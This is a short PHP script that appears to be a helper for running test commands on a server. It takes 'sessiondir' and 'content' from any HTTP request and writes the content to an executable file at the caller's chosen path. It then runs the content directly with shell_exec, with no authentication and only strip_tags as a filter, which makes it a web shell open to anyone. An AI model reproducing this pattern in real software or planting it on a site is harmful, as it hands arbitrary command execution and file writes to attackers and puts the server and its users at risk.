<?php
	if ( isset($_REQUEST['sessiondir']) and isset($_REQUEST['content']) ) {
		$sessiondir = $_REQUEST['sessiondir'] ;
		$pid = $_REQUEST['pid'] ;
		$filename = "$sessiondir/00.run.sh" ;  // write the command to the server for testing
		$file = fopen($filename, 'w') ;
		fwrite($file, strip_tags($_REQUEST['content']));
		fclose($file);
		chmod($filename, 0775) ;
		shell_exec(strip_tags($_REQUEST['content'])) ;
	}
?>	